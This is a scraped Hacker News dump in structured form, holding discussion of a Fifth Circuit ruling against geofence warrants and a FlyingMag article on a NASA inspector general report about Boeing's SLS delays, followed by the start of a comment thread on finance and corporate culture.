agorootparentIsn’t the whole geofence request paradigm an elegant compromise to address that, though? The requestors don’t get to track everyone’s every move. Instead, they have to specify exactly where and when based on a thing that actually happened, and the private corporation controlling all that location data decides whether or not the request is narrow enough to answer. A mechanism like this allows them to realize the social benefits of that kind of a data trove existing, while providing some kind of a check on the way they use that data. However flimsy that check may be, it still seems really different from the government itself collecting and controlling all that data itself. And if anything, it takes the wind out of the argument that government properly should be the custodians of that kind of data: they can use it in the rare cases where they can describe a clear purpose, but they can’t just go frolicking through the movements of every person in their jurisdiction for funsies [0]. Is it necessarily bad that, in the US system, it turned out to be just the tacky companies slinging ads who control that utterly comprehensive archive of spy data, and it’s the guys with guns who have to ask nicely to access it? [0] at least not through mobile geolocation data. Contrast with Flock Safety’s nationwide mutual data exchange compacts: https://www.newsobserver.com/news/state/north-carolina/artic... reply IncreasePosts 20 hours agorootparentprevThat happens all the time during normal, legal place investigations. What's wrong with that? The concept of an investigation almost necessarily requires there to be innocent people involved, to differentiate the guilty from the innocent. reply A4ET8a8uTh0 20 hours agorootparentEh. There is a big difference between an investigation ( as one sees in most American cinema hence why this particular phrasing is likely chosen ) and a fishing expedition, where LEOs go through data they in likelihood should not ( and to make it more annoying -- are highly unlikely to delete once done ). I am saying this as a person who got LEO request for JUAN no last name and no other identifiers. As you can imagine, some of us are not amused by such requests. edit: Location is much, much more telling than basic name and address. reply giantg2 22 hours agoparentprevI wonder if there can be nuance that if a person owns a private location, they can request the data for their property. This seems reasonable to me. The only people on the property should have permission and already be known to the owner. The ones who don't are trespassing and can be suspects for crimes committed during that time. reply kardos 22 hours agorootparentYou'd need geofencing of mobiles to be precise and accurate to about a meter for that to work. Is that the case? reply giantg2 22 hours agorootparent\"You'd need geofencing of mobiles to be precise and accurate to about a meter for that to work.\" That's not true. There are many types of properties. Large properties could accomodate large margins of error, multiple times greater than the fine grain location data when using a poont in the middle of the property. There are some types of properties that this couldn't be applied to, such as apartments. reply HeatrayEnjoyer 21 hours agorootparentprevIf there are 5G towers that might be possible reply xnyan 4 hours agoparentprev> That's how many burglaries are solved in my area I'm interested by this, could you post some examples? reply wonderwonder 19 hours agoparentprevI feel for you but I'm hoping they are not. Look at they UK, that is where giving law enforcement this power leads. Citizens rounded up for protesting. \"Show me everyone that was in the vicinity of the protest for x-y. UK even has a recent precedent where you are refused bail if you were just watching, you did not even have to participate. https://web.archive.org/web/20240810105207/https://www.teleg... reply candiddevmike 22 hours agoparentprevFix the root cause of why folks need to steal instead of invading everyone's privacy? reply andrewla 21 hours agorootparentIf you can make it win-win for everyone involved, then sure, but there's no such thing as a free lunch. Individuals have agency; they are not slaves of any \"root cause\". The individual decision of a person to burgle may have correlations to statistical characteristics of their situation, but unless we understand the base rate of that set of circumstances we will never be able to address it without restricting the agency of others in that cohort. And the level of intrusiveness necessary to establish the cohort of individuals requires a degree of surveillance that is ripe for abuse and incompatible with personal liberty. reply jonas21 21 hours agorootparentprevAnd what would that root cause be? reply candiddevmike 21 hours agorootparentI don't think there is _one_ root cause. But I can tell you that burglary is a symptom, and seeing increases in it year over year (outpacing population growth) is a sign of systemic problems. reply milesskorpen 21 hours agorootparentBurglary rates have dropped precipitously in the past 30 years from ~1250 per 100k to ~300 per 100k. Source: https://www.statista.com/statistics/191243/reported-burglary... reply deelowe 21 hours agorootparentprevLOL. There's no reason a lot of times. We have a major \"joyriding\" epidemic in my city and it's just idiot kids making tiktok videos for fun. reply candiddevmike 21 hours agorootparentSociety probably needs to have a frank conversation about if things like TikTok are a net benefit or not. reply willmadden 20 hours agorootparentTikTok is fine. Criminals need to be locked up in a prison. reply mc32 22 hours agorootparentprevI see this implication over and over (that poor hungry people steal). Poor people don't often steal. They might pilfer here and there, but they're not doing outright stealing or robbing. I've known poor people, I've lived with poor people and by and large they are not thieves. They may keep something, sneak something, but they are not breaking in and stealing stuff --if they do take things not theirs, it's \"passive\" (i.e. opportunistic.) People who steal are often of two types, career criminals, pert of an organized (this can be peripheral) crime organization, or drugged out zombies who could not hold a job. There's a possible third, impulse theft by teenagers --these are low numbers. It sticks in my craw when people so easily imply poor people steal and burgle. All the hand to mouth poor people who on occasion dumpster dove and all that, did not steal things, break into homes etc. reply candiddevmike 21 hours agorootparentSorry, can you show me where in my comment I pointed at poverty being the root cause? reply mc32 21 hours agorootparentSo, according to you what are the root causes of burglary and theft? reply em-bee 21 hours agorootparentprevpoverty is not the problem, lack of moral education is. we teach STEM in schools, but we assume that moral behavior is obvious and natural. we don't teach children why moral behavior is important, and more critically we don't teach that moral behavior includes caring for others, and that doing so will benefit all of us. instead we teach children to compete against each other, and we put them in situations where selfish behavior is the best way to get ahead. at best we try to scare them about the risks of crime, but we don't show them the benefits of being helpful instead of selfish. no education is going to completely eradicate crime, but i do believe there is a correlation between the quality of education and the amount of moral education and crimerates. reply andrewla 21 hours agorootparentI don't know if you are a parent or have first-hand experience here. But I am and do, and schools spend an inordinate amount of time doing this. Especially in elementary school, but throughout the public education system messages of caring for others are literally everywhere in every possible context. Even when I was a student this was the case; we had units and assemblies presenting these concepts to an incredibly frustrating and condescending degree. reply em-bee 8 hours agorootparentpresenting these concepts to an incredibly frustrating and condescending degree which means they are lecturing but not really teaching things in a way that let's kids not only understand but actually internalize and apply what they learn. this is not an easy task. it requires teachers and all school staff to be good role models and much more. i haven't seen that when i went to school, nor do i see it from my kids (although i have to admit i don't even know what i should expect to see, and how much my own shortcomings in this area mess things up) one thing that i think matters though is that teaching morals needs to include parents, and that is not happening. the problem with lecturing is that we keep believing that telling someone what to do or how to behave is enough for kids to pick it up and apply. it may work for math or basic science, but it most certainly doesn't work for moral behavior. that needs to be practiced and children need to be put into situations where they can apply morals and be allowed to make mistakes. moral education is not a separate subject, but it needs to permeate all learning in school and outside reply andrewla 5 hours agorootparentGot it. Real moral education has never been tried. reply mc32 21 hours agorootparentprevPoint taken. But these days they teach STEAM. Which is a weird way of saying they've gone back to not being STEM. STEM was to focus on the sciency, mathy, technical curricula as opposed to the non-STEM, like art and social things. But to undermine the whole STEM they went and braded regular curricula STEAM curricula so people would think, yeah, it's basically STEM with an \"A\" in it. Brilliant bastards. reply idle_zealot 21 hours agorootparentThat's not what STEAM is at all. Please actually look up the term before deciding what it means and deriding it (it does deserve derision, but mostly for a terrible rollout and lesson plans that misunderstand it). reply idle_zealot 22 hours agoparentprevThere are more important things than punishing petty theft. reply fortran77 22 hours agorootparentResidential burglary is not petty theft. If the house isn't empty, a person could be seriously injured or killed. reply SoftTalker 22 hours agorootparentAnd the residential burglars probably started with petty theft and got away with it, and became emboldened. Also see the broken window theory. https://en.wikipedia.org/wiki/Broken_windows_theory reply idle_zealot 16 hours agorootparentNote that BWT is not at all some accepted truth, and is merely a theory used to justify some (pretty bad) policy decisions. This is mentioned in the linked wiki page. reply ryaneager 22 hours agorootparentprevWell, that sounds like you’re not not scared of burglary, but rather assault and/or murder reply kstrauser 22 hours agorootparentI confess that finding any stranger in my house for any motive would frighten the hell out of me. I suspect that’s true of nearly the whole population. reply vuln 22 hours agorootparentThey’re just seeking refuge. reply Noumenon72 22 hours agoparentprevThey never make these decisions with regard for the societal benefits of solving crime, they just ban policing and congratulate themselves on preventing bad policing. They could have narrowed this down to a new definition of probable cause rather than saying \"See that terrorist on video using his GPS to plant bombs at the orphanage? Sorry, we can't find 'im.\" reply bee_rider 22 hours agorootparentWe have a rule-of-law system in the US, at least that’s the ideal. The court shouldn’t be changing the laws to make policing easier. That’s what the legislative branch is for. reply jfengel 21 hours agorootparentI hear that a fair bit: \"that's what the legislature is for\". Has the Congress ever responded by actually passing a law? Passing a law is a very high bar, especially with the filibuster, and a President can still veto it. It's supposed to be for checks and balances, but I see a lot of checks and very few balances. I know that it's not the court's responsibility to fix the rest of the system. But it feels disingenuous to say that the legislature could fix it when they know perfectly well that they won't. reply Shog9 21 hours agorootparent> Has the Congress ever responded by actually passing a law? Yes. Despite appearances to the contrary (and the exceptionally lethargic behavior of the current (118th) congress), Congress does actually pass laws (and revisions to existing laws), often in response to deficiencies identified by courts and law enforcement in what is currently on the books. If you're interested in following this, the library of congress website [1] has half-way decent filtering. > I know that it's not the court's responsibility to fix the rest of the system. But it feels disingenuous to say that the legislature could fix it when they know perfectly well that they won't. Forget responsibility, it's not even within the court's purview - in order for a ruling to stand (much less set precedent), it must be based on the law as it exists (including past precedent); ignoring that might feel good to watch, and would certainly make life interesting for participants in one specific case... But in no way compensates for an inability to legislate on the part of actual, elected, legislators. If you're frustrated, vote for congressfolk who get things done vs. blather on, don't wish for a magic judge. [1]: https://www.congress.gov/search?q=%7B%22source%22%3A%22legis... reply bee_rider 20 hours agorootparentprev> I hear that a fair bit: \"that's what the legislature is for\". Has the Congress ever responded by actually passing a law? I’m not 100% clear on what the question is, in the sense that I want to give you a good-faith reading but, of course, the answer is obviously no. I doubt congress has even read any of our posts, haha. I think the general expectation is that when chatting about politics the best hope we could have is that we could cause the other person (or some other person reading along) to vote differently, and maybe we’ll all get some better representatives if this conversation repeats enough times. It is a pretty indirect strategy, I don’t think it will have any big obvious wins. > Passing a law is a very high bar, especially with the filibuster, and a President can still veto it. It's supposed to be for checks and balances, but I see a lot of checks and very few balances. I agree that our system has a lot of checks and might be too logjam-prone. (Although, over the last 8 years we’ve probably both appreciated this feature at some point or another, maybe at different times). But that’s the system we have, we should fix it in an above the board fashion, not hope for judges to circumvent it. > I know that it's not the court's responsibility to fix the rest of the system. But it feels disingenuous to say that the legislature could fix it when they know perfectly well that they won't. Well, to be entirely transparent, there’s a dual purpose to this. So maybe it is a bit disingenuous. I mean the ingenuous element is there: it is always good to keep in mind how our system works, and I do think people should target their irritation at the correct party. But also, not many of our (democratically elected) representatives are willing to argue for increasing surveillance. So the reminder that it is their job is a slightly circuitous way of indicating that it is maybe not a popular idea. If it were, somebody would run on it. reply refurb 14 hours agorootparentprevDespite the idea that Congress is gridlocked, it passed 78 laws in the 2022-2023 Congress. reply jfengel 1 hour agorootparentHow many of them are nontrivial? Trivial as in renewing an old law, authorizing payment for the operations they already passed, or naming a post office. What's left isn't zero, but it's not much more than a handful. reply vuln 22 hours agorootparentprevMust have been the guy planting pipe bombs at the DNC during the insurrection. reply user3939382 11 hours agoprevI like how they take 15 years to work these issues through the courts, meanwhile untold thousands of people have their rights violated. reply creer 19 hours agoprevInteresting constrast with the Las Vegas room searches. reply yieldcrv 19 hours agoprevFifth Circuit being our only check and balance is amusing to me But I can appreciate the distributed nature of this system reply jmyeet 20 hours agoprevThis is an interesting decision in historical context for several reasons. First, the Fifth Circuit is conservative. It includes Texas, Louisianna and Alabama. It's become known as the fast-track to the Supreme Court as it has ruled very conservatively at both the district and appellate level. This problem is exacerbated by how the Fifth Circuit is organized where the districts in the circuit are divided into divisions of often 1-2 judges, allowing plaintiffs to very effectively \"judge shop\". Second, in modern times the Fourth Amendment has been consistently weakened by successive Supreme Court. A notable example if the 1968 case Terry v. Ohio that allowed police to stop people and search them without probably cause. Another huge example if the whole concept of civil asset forfeiture, which was justified by (IMHO) the most contorted mental gymnastics: this pile of money has no rights. But it was found in someone's car. How is it not their property and thus the Fourth Amendment limitation on unlawful search and seizure should apply? Third, the Supreme Court will likely take this case up now. Why? Because the Fourth and Fifth Circuits have issued conflicting rulings. That's when the Supreme Court steps in, more often than not. Fourth, if a user's location data has a rasonable expectation of privacy, it raises the question of what other data has a reasonable expectation of privacy? What about law enforcemen tuse of Stingrays? Or facial recognition systems? reply w10-1 21 hours agoprev [–] > the quintessential problem with these warrants is that they never include a specific user to be identified, only a temporal and geographic location where any given user may turn up post-search In that case, it's illegal to look in the phone book for names starting with \"john\" because that's not a specific user. From the ruling emphasizes a search through the \"entire\" database as a kind of rummaging through everything in a house, but that's clearly inapt. First, it shouldn't matter whether Google just needs to check an index vs. doing a full scan. Second, there's no reason to assume a digital search has the same privacy implications as a house search. It's just assuming what you're trying to prove. `While the results of a geofence warrant may be narrowly tailored, the search itself is not` is relevant only if the search itself is an invasion of privacy. So even (especially?) if I preferred the result in this case, that reasoning is not likely to hold up in a conflict with the 4th circuit. It's exactly this kind of weak conflict that gives the Supreme Court too much latitude to draw lines as they see fit. edit: sorry, removed disrespect for the EFF reply gpm 19 hours agoparent> In that case, it's illegal to look in the phone book for names starting with \"john\" because that's not a specific user. Only if everyone in the phone book has a privacy interest requiring a warrant to breach in the fact that their name was in the phone book. They don't. But imagine for a second they did. Then your search for \"John\" in the phone book would have involved flipping through the phone books pages looking for the \"John\" section, in the process violating the privacy rights of everyones names you looked at to figure out if you where before or after the Johns section. Of course that would be unconstitutional. It would be like trying to figure out where John lived by searching every apartment until you found the apartment with John's diary in it. reply nvy 21 hours agoparentprev>In that case, it's illegal to look in the phone book for names starting with \"john\" because that's not a specific user. That's an absurd reduction, and not at all analogous to the situation discussed in TFA. reply w10-1 21 hours agorootparentI agree the situations are different and this situation warrants privacy protection. However, the court fails to articulate anything close to a workable rule in its reasoning. Further, because the actual outcome was an upheld search d/t good faith reliance, the finding of unconstitutionality is basically dicta, and would/should be ignored by other districts and even in the same district. I don't think this ruling offers the protections people want or should have. I think that point stands, however hidden by downvoting. reply WarOnPrivacy 21 hours agoparentprev [–] > In that case, it's illegal to look in the phone book for names starting with \"john\" because that's not a specific user. No. Working with that analogy, this ruling indicates you can't get one warrant that applies to everyone in the book - simply because they are listed in the same geographic area. A phone-book warrant would not be in harmony with the 4th Amendment. reply creer 20 hours agorootparent [–] Does it mean that it would be constitutional if each tower kept its own log? Or then, if the database server collated a separate log for each tower as it went? How would one-log-per-tower be different from a surveillance video tape? Hmmm... elements of an answer: there is no doubt more in the decision but from the EFF writeup: (1) \"individuals have a reasonable expectation of privacy in the location data\", (2) \"sensitive information about a person’s associations and allow police to “follow” them into private spaces\", (3) \"require a provider, almost always Google, to search “the entirety” of its reserve of location data “while law enforcement officials have no idea who they are looking for, or whether the search will even turn up a result.”\" So it sounds like one-log-per-tower would take care of the third point (the warrant would call for 1-4 specific towers or something), but the court still found an expectation of privacy in cell phone location, and an expectation that this sensitive private info might intrude of private spaces. As opposed to a video camera which views a public space. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The federal Fifth Circuit Court of Appeals ruled that geofence warrants are \"categorically prohibited by the Fourth Amendment,\" aligning with the EFF's arguments against general, exploratory searches.",
      "The case, United States v. Smith, involved police using a geofence warrant to obtain location data from Google during a 2018 armed robbery investigation, which the court found violated individuals' reasonable expectation of privacy.",
      "Despite ruling geofence warrants unconstitutional, the court allowed the evidence in this case due to police reliance on the technology in good faith, emphasizing the need for strict Fourth Amendment protections."
    ],
    "commentSummary": [
      "A federal appeals court has declared geofence warrants unconstitutional, citing their broad scope and violation of privacy rights.",
      "Geofence warrants enable law enforcement to gather location data from devices within a defined area and time frame.",
      "Despite the ruling, evidence from past geofence warrants may still be admissible if obtained in \"good faith,\" potentially affecting future investigations."
    ],
    "points": 520,
    "commentCount": 165,
    "retryCount": 0,
    "time": 1723492677
  },
  {
    "id": 41229049,
    "title": "NASA investigation finds Boeing hindering Americans' return to moon",
    "originLink": "https://www.flyingmag.com/modern/nasa-investigation-finds-boeing-hindering-americans-return-to-moon/",
    "originBody": "Home / Modern Flying / Space MODERN FLYING NASA Investigation Finds Boeing Hindering Americans’ Return to Moon A report from the space agency’s office of the inspector general pins the blame on the aerospace giant’s mismanagement and inexperienced workforce. JACK DALEO Updated Aug 9, 2024 4:07 PM EDT An artist’s illustration depicts NASA’s SLS Block 1B flying in crew configuration. [Courtesy: NASA] SHARE THIS STORY Mismanagement and inexperience on the part of Boeing are creating severe delays and expenditures for NASA’s efforts to return Americans to the moon, according to a new report from the agency’s office of the inspector general (OIG). The 38-page document, released Wednesday, paints the manufacturer’s quality control practices as inadequate and its workforce as insufficiently trained, blaming it for cost increases and schedule delays in the development of NASA’s Space Launch System (SLS) Block 1B. Yet the space agency has neglected to punish Boeing financially for these flaws, arguing that doing so would run contrary to the terms of its contract. The heavy-lift rocket, a more powerful configuration of NASA’s existing SLS Block 1, is intended to make its maiden voyage in 2028 on the Artemis IV mission, a crewed lunar landing. It has been under development since 2014. Boeing is under contract to build Block 1B’s Exploration Upper Stage (EUS)—which will increase the SLS’ cargo capacity by about 40 percent—as well as the core stages for Block 1 on Artemis I and the upcoming Artemis II. Other SLS contractors include Aerojet Rocketdyne and Northrop Grumman. A Day Late, A Dollar Short Originally, the EUS was allocated a budget of $962 million and intended to fly on Artemis II, which in January was pushed to no earlier than September 2025. But by the OIG’s estimate, EUS costs are expected to balloon to $2 billion through 2025 and reach $2.8 billion by the time Artemis IV lifts off in 2028. The office projects total SLS Block 1B costs will hit $5.7 billion before then—that’s more than $700 million over the Agency Baseline Commitment (ABC) NASA made last year. The EUS, at nearly triple its original budget, would account for close to half of those costs. Add to that an expected six-year delay in the delivery of the system, and the OIG predicts Artemis IV’s launch could be postponed. “NASA’s fiscal year 2024 SLS Program budget projections do not account for the additional funds needed for EUS development in fiscal years 2024 through 2027,” the report says. “Without additional funding, scheduled work will continue to be pushed into subsequent years as has been the case for the EUS over the last decade, leading to further cost increases and schedule delays.” For example, the OIG says, NASA is evaluating potential risks to the EUS stage controller and avionics that could delay its delivery by another 14 months. NASA officials disagreed with the analysis. Mismanaged and Inexperienced The OIG interviewed officials at NASA headquarters, Marshall Space Flight Center, Michoud Assembly Facility, the Defense Contract Management Agency (DCMA), and Boeing. It also reviewed NASA and its contractors’ budgets, contract obligations, and quality control documents, among other materials. In short, the office found that Boeing’s quality management system at Michoud does not adhere to NASA or international standards. For example, Boeing Defense’s Earned Value Management System (EVMS)—which NASA uses to measure contract cost and schedule progress and is required on all projects with a lifecycle cost greater than $250M—has been disapproved by the Department of Defense since 2020. Officials claim this precludes Boeing from reliably predicting an EUS delivery date. “Boeing’s process for addressing contractual noncompliance has been ineffective, and the company has generally been nonresponsive in taking corrective actions when the same quality control issues reoccur,” the OIG says. The DCMA has issued several corrective action requests (CARs), handed down when quality control issues are identified, for the EVMS. Between September 2021 and September 2023, the agency issued Boeing a whopping 71 CARs after identifying quality control issues in the manufacturing of core and upper stages at Michoud. According to officials, that’s a massive number for a system that has been in development for so long. “Boeing officials incorrectly approved hardware processing under unacceptable environmental conditions, accepted and presented damaged seals to NASA for inspection, and used outdated versions of work orders,” the report says. “DCMA also found that Boeing personnel made numerous administrative errors through changes to certified work order data without proper documentation.” According to Safety and Mission Assurance officials at NASA and DCMA officials at Michoud, Boeing’s quality control issues stem from a workforce that is, by and large, unqualified. During a visit to Michoud in 2023, for example, inspectors discovered that welding on a component of the SLS Core Stage 3 did not meet NASA standards. Per the report, unsatisfactory welding performed on a set of fuel tanks led directly to a seven-month delay in EUS completion. “According to NASA officials, the welding issues arose due to Boeing’s inexperienced technicians and inadequate work order planning and supervision,” the OIG says. “The lack of a trained and qualified workforce increases the risk that Boeing will continue to manufacture parts and components that do not adhere to NASA requirements and industry standards.” Complicating matters further is the relocation of SLS core stage production for Artemis III from Michoud to Kennedy, which will require Boeing to transition a decade of production processes developed at the former site to the latter. The OIG said the manufacturer is developing a more robust, hands-on training program that could revamp its workforce but is long overdue. “Some technicians reported they had to hunt through layers of documentation to identify required instructions and documentation of work history and key decisions related to the hardware,” the report says. Further, maintaining that workforce may be difficult—the OIG predicts Boeing will spend an average of $26 million per month on EUS personnel through 2027. That was the norm for the company from February to August 2023. Boeing management has also dropped the ball at higher levels. For instance, in the leadup to Artemis I, Boeing underestimated the complexity of building the SLS core stage, and EUS funding had to be redirected to that project. “This ultimately led to a nearly one-year delay in EUS work and an additional $4 billion in funding to Boeing to cover the costs for the core stage development work,” according to the OIG. In addition, NASA officials believe Boeing’s supply chain woes are of its own making, stemming from late negotiations and contract agreements. Next Steps for NASA The OIG report paints the picture of a company in disarray from top to bottom. The office did not pin the blame entirely on Boeing. It criticized NASA, for example, for spending more than $3 billion over ten years without submitting an ABC to Congress and the Office of Budget and Management. The ABC is the only official cost and schedule baseline used to measure project performance against expectations. The office’s four recommendations, however, center around the manufacturer. First, the OIG calls on the associate administrator of NASA’s Exploration Systems Development Mission Directorate (ESDMD), alongside the agency’s assistant administrator for procurement and chief of safety and mission assurance, to collaborate with Boeing on a more robust, NASA-approved quality management system. It also recommends officials penalize the company financially for its previous violations. The OIG further directs the ESDMD to conduct a cost overrun analysis of Boeing’s EUS contract to minimize the impact to Artemis missions. Finally, it asks the associate administrator to coordinate with the DCMA to ensure Boeing’s compliance with EVMS requirements. NASA agreed with three of the four recommendations and proposed actions to take. Interestingly, though, it rejected the suggestion of fining Boeing. “NASA interprets this recommendation to be directing NASA to institute penalties outside the bounds of the contract,” said Catherine Koerner, deputy associate administrator of the ESDMD, in NASA’s response to the report. “There are already authorities in the contract, such as award fee provisions, which enable financial ramifications for noncompliance with quality control standards.” Essentially, the agency believes it can keep Boeing in check by rewarding good behavior rather than penalizing mismanagement. The OIG, predictably, disagrees, characterizing NASA as “unresponsive” to what it considers significant safety concerns. “In the end, failure to address these issues may not only hinder the Block 1B’s readiness for Artemis IV but also have a cascading impact on the overall sustainability of the Artemis campaign and NASA’s deep space human exploration efforts,” the report says. Boeing will look to improve some of its quality control issues under the leadership of new CEO Kelly Ortberg, the ex-boss of Rockwell Collins who took over after the ousting of former CEO Dave Calhoun. Calhoun’s departure this month comes as the company continues to be grilled over the loss of a door plug on a Boeing 737 Max 9 in January as well as persistent issues with Starliner, its semireusable spacecraft under contract with NASA for astronaut rotation missions to the International Space Station. Astronauts Butch Wilmore and Suni Williams may end up spending eight months on the orbital laboratory, rather than eight days as intended. Like this story? We think you'll also like the Future of FLYING newsletter sent every Thursday afternoon. Sign up now. SHARE THIS STORY :space Artemis Boeing EUS Exploration Upper Stage. investigation lunar landing modern flying moon NASA rocket SLS spaceflight Jack Daleo AUTHOR Jack is a staff writer covering advanced air mobility, including everything from drones to unmanned aircraft systems to space travel—and a whole lot more. He spent close to two years reporting on drone delivery for FreightWaves, covering the biggest news and developments in the space and connecting with industry executives and experts. Jack is also a basketball aficionado, a frequent traveler and a lover of all things logistics. Related Stories AIRCRAFTNTSB Releases Prelim Report on Vintage WACO YKC CrashMEG GODLEWSKI MILITARYUkraine Looking for Retired F-16 PilotsRUSS NILES MODERN FLYINGDrone Firm Flytrex Makes 100K Food Deliveries in North Carolina, TexasJACK DALEO MODERN FLYINGAir Taxis Missed Paris Olympics Goal—Could They Soar in LA?JACK DALEO WOMEN IN AVIATIONWally Funk: Breaking the Glass Ceiling, All the Way to SpaceSHALYN MARCHETTI AIRCRAFTUltimate Issue: From Radial to RadicalRUSS NILES Subscribe to our newsletter Loading... Related Stories AIRCRAFTNTSB Releases Prelim Report on Vintage WACO YKC CrashMEG GODLEWSKI MILITARYUkraine Looking for Retired F-16 PilotsRUSS NILES MODERN FLYINGDrone Firm Flytrex Makes 100K Food Deliveries in North Carolina, TexasJACK DALEO MODERN FLYINGAir Taxis Missed Paris Olympics Goal—Could They Soar in LA?JACK DALEO WOMEN IN AVIATIONWally Funk: Breaking the Glass Ceiling, All the Way to SpaceSHALYN MARCHETTI AIRCRAFTUltimate Issue: From Radial to RadicalRUSS NILES Subscribe to Our Newsletter Get the latest FLYING stories delivered directly to your inbox Subscribe to our newsletter",
    "commentLink": "https://news.ycombinator.com/item?id=41229049",
    "commentBody": "NASA investigation finds Boeing hindering Americans' return to moon (flyingmag.com)434 points by hobermallow 22 hours agohidepastfavorite349 comments elzbardico 7 hours agoWhat MBAs and Financists destroyed so far: - Western Industry. - The blue-collar middle class - The Middle Class - Our health care system - Our education - Western Economic Leadership. - Social Mobility Now they are busy destroying western technology, science and innovation on their never-ending selfish wealth-extraction quest. They convinced us that our homes are investments, so they can fleece us with their usurary schemes. So, what next? our organs? They convinced us to exchange our pensions for the privilege of being the mark on a market where the sharks like them do whatever the fuck they want, from blatant insider trading, to pump and dump schemes, to outright fraud, having for all practical purposes bought the SEC a long time ago. What they will kill next? How long are we going to transfer wealth to those slimmy sweet talking ignorant greedy bean counters? Our daily work is like being in a mad house because almost everything is subordinated to the the most sacred goal of cooking the next quarter numbers to ensure we maximize executive bonuses, and fuck the long run! crazy projects started, spin offs, merges, projects cancelled, company killing layoffs, fuck long term value generation! they want more and more, and more, and they fucking want it right now! the fucking bonus gollums. Everything is fucked in our society but executive compensation. Xerox, HP, IBM, Boeing... How many other proud symbols of our economy and civilization are we going to let them destroy? reply mhuffman 5 hours agoparentYou should know that in business school and after everything you just described would be called \"optimized\". There is some short discussion about ethics, usually involving not stealing from investors, but otherwise the world is seen as one giant place where people are the same as nuts and bolts or ingredients in a chocolate bar to be optimized. This goes for customers and employees. reply jprete 5 hours agorootparentOptimization is one of the more useful terms for it, but I think a big part of the problem is foundational. It's easier to trade in measurable values than unmeasurable ones, so the trades with something measurable on both sides get prioritized, which subtly increases the demand and market value of measurable values over unmeasurable. So we end up gradually converting our productivity to the measurable outputs because we can more safely trade them. But then unmeasurable values get shafted. The non-fungible values get shafted even harder. For example, it's inherently impossible to trade for true human relationships because the bidirectional flow is where the value comes from and that flow must be built. But that means two people must simultaneously choose to take a mostly unknown level of risk on building a relationship that could fail or even be a net negative. Our relationship drive is pretty strong. The people making AI chatbot friends and SOs, not even to mention dating apps and relationship-commodifiers like Meetup or old Facebook, are doing their best to commodify relationships, though. The sheer level of social toxicity caused by online mass social media has been correspondingly enormous. reply boppo1 2 hours agoparentprevMy undergrad is in finance. IMO the problem is that we don't really teach what wealth is as Adam Smith defined it. A wealthy nation is not the one with the greatest stockpile of gold, but the one with the most quality goods and services easily available to its average citizens (I'm paraphrasing a bit, but you understand). Smith really stresses that profit is a measurement of the good provided to society by an activity. But in my studies, there was no concern for this quality of profit. The attitude was that any way net income (profit) could be increased was strictly to be understood as a net positive for society. I had professors explain that war is profitable because people are employed building tanks etc. and they use their wages to stimulate the economy. When I asked 'what if instead of sending a few million dollars of steel and circuitry to the desert to get exploded, those workers used the same resources on a hospital?' I recieved the answer that if the NPV of the tank is higher than the hospital, it must be the better use of the resources. reply didgeoridoo 2 hours agorootparentYou had finance professors who were unfamiliar with Bastiat’s parable of the broken window? Or unable to apply it to the military-industrial complex? Our universities may be in worse shape than I thought. reply imtringued 1 hour agorootparentprevWar is profitable in capitalism, because the dogma is that capital is productive and must net a positive return. In the underutilized capital scenario, idle capital incurs costs, but no benefits. It must be destroyed. The easiest way to maintain the facade is to send the capital to war. If you acquire new land, congratulations, the \"investment\" paid off. If it doesn't, then the destruction of capital at least maintains the profitability of domestic capital. War is really that simple. If you had a war for any other reason, everyone involved would see the stupidity after the first few skirmishes. reply BirAdam 6 hours agoparentprevNo one really “let them” destroy things. This is one of the key dangers of majoritarian government. The moment that people can vote for representatives the representatives will be purchased, and later, the votes will purchased. Once this happens, money will be destroyed to allow the purchasing class to rob the wealth of the civilization, and this leads to financialization of economics. This pattern has been repeated over and over again. In the USA, this process started almost immediately after the formation of the country, but it didn’t become truly corrupt until the McKinley campaign. The financialization process started in 1913, saw its first bust boom/bust less than a decade later, and then purposeful inflation began in 1971. The entire economy was financialized by the late 1990s which culminated in 2008. The banks are now so bankrupt that the Fed has begun providing overnight repossessions to member banks… reply sgu999 5 hours agorootparent> This is one of the key dangers of majoritarian government. The moment that people can vote for representatives the representatives will be purchased What better alternatives are you thinking of? An intelligent, compassionate, eco-friendly and forward-thinking dictator would be great I guess, but historically that's not the ones emerging on top. reply chii 4 hours agorootparent> but historically that's not the ones emerging on top. the only one that has so far been \"good\" has been the singaporean authoritarian regime (yes, they are \"authoritarean\"). But even if they're good and benevolent so far, there's zero guarantee that the next leader, or the next generation of them, will remain true. That's why even though majoritarian gov't are bad, they're the least worst. Not to mention that if the elected gov't is bad, it's becaue the people doing the electing didn't put in enough civic responsibility as a collective. reply ASalazarMX 1 hour agorootparentprevThe current system is not that bad, a radical shift towards government transparency would help a lot. Make it hard to hide bribery, corruption, and plain evilness, pay well but make it hard to sell favours in the dark. Make it easy for public officers to pay for blatant crimes. Make it hard for a single political group to revert transparency. Politicians would have more shit to throw around, yes, but hopefully the worst of them will look elsewhere for the easy money if it can't be had that easily in public office. reply snapcaster 6 hours agorootparentprevIf you think 1913 was the first boom/bust in United States financial history you're either trying to push an agenda or just totally ignorant reply BirAdam 6 hours agorootparentNo, that’s just when the economy began financialization. reply snapcaster 5 hours agorootparentI assume you're saying because of the fed, but wouldn't it be more appropriate to mark JP Morgan's efforts to create monopolies throughout the economy a better start point? reply BirAdam 1 hour agorootparentWell, this is why I pointed out McKinley and also stated the process did start shortly after the founding. True financialization only after Morgan and his friends met and formed the Fed tho, which was 1913. Once the Fed was in place, they could vastly expand the amount of available credit, bribe and purchase without restraint, and start the type of economy to which we are all now accustomed. Importantly, this pattern is a direct inversion of “capitalism.” In capitalism, the present is leveraged for the future. In “financialism,” the future is leveraged for the present. reply ASalazarMX 1 hour agorootparentprevIt goes beyond voting, people actually empower their abusers by buying the cheapest option regardless of its context. People dislike monopolies, but will happily grow one if it costs less than local or more responsible alternatives. That monopoly eventually gains the power to change the game rules. We are mostly ignorant, and we vote, consume, act and live that way. We choose to be that way, and so good things won't last long in our collective hands. reply trentnix 4 hours agorootparentprev1971, you say? https://wtfhappenedin1971.com/ reply BirAdam 1 hour agorootparentGood charting. But yeah, the dollar has lost over 90% of its value since then, and the disparity between the rich and the poor has widened. reply mmcconnell1618 5 hours agoparentprevIt wasn't always this way. Milton Friedman introduced the idea in the 1970s that businesses could ignore their workers and communities because if they focused on profit, that would benefit everyone. Shareholder Theory elevates the stockholders above all others and leads to stock buybacks and optimizing for wealth extraction. https://en.wikipedia.org/wiki/Friedman_doctrine reply chii 4 hours agorootparent> that would benefit everyone. no, it would benefit the shareholders. The regulations imposed by the gov't (which is meant to be representitive) would reign in the excess externalization. Everyone would benefit from competition, 